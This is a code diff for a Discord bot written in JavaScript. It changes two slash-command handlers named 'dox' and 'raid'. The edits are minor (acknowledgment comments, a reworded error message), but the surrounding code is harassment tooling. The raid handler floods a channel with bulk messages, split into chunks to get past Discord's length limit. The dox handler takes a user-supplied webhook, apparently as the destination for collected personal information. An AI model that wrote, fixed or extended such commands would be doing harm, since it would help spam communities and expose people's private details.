@@ -104,6 +104,7 @@ client.on('interactionCreate', async (interaction) => {
 
     // ---- DOX ----
     if (interaction.commandName === 'dox') {
+        // ACKNOWLEDGE IMMEDIATELY
         await interaction.deferReply({ ephemeral: true });
 
         const customWebhook = interaction.options.getString('webhook');
@@ -134,11 +135,12 @@ client.on('interactionCreate', async (interaction) => {
 
     // ---- RAID ----
     if (interaction.commandName === 'raid') {
+        // ACKNOWLEDGE IMMEDIATELY
         await interaction.deferReply({ ephemeral: true });
 
         const channel = interaction.channel;
         if (!channel) {
-            return interaction.editReply('❌ This command can only be used in a server channel.');
+            return interaction.editReply('❌ Could not find the channel. Make sure the bot is in this server.');
         }
 
         const count = Math.min(interaction.options.getInteger('count') || 20, 35);
@@ -155,7 +157,6 @@ client.on('interactionCreate', async (interaction) => {
             
             const bigMessage = lines.join('\n');
 
-            // Send the raid messages
             if (bigMessage.length > 2000) {
                 const chunks = bigMessage.match(/[\s\S]{1,1990}/g) || [];
                 for (const chunk of chunks) {
@@ -165,7 +166,6 @@ client.on('interactionCreate', async (interaction) => {
                 await channel.send(bigMessage);
             }
             
-            // Only edit the reply if the interaction is still valid
             try {
                 const row = new ActionRowBuilder()
                     .addComponents(
